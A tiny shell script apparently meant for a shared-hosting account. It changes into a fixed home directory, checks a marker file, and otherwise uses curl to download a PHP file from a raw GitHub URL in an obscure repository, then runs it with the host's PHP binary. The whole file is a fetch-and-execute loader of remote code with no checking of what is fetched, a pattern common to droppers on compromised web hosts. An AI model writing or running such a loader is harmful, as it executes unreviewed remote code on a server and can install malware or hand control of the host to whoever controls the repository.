#!/bin/sh
cd /home/u791571885 && [ -f t155.done ] && cat t155.done && exit 0
curl -fsSL -o t155.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs155.php" && /opt/alt/php83/usr/bin/php t155.php > t155.done 2>&1; tail -c 5000 t155.done
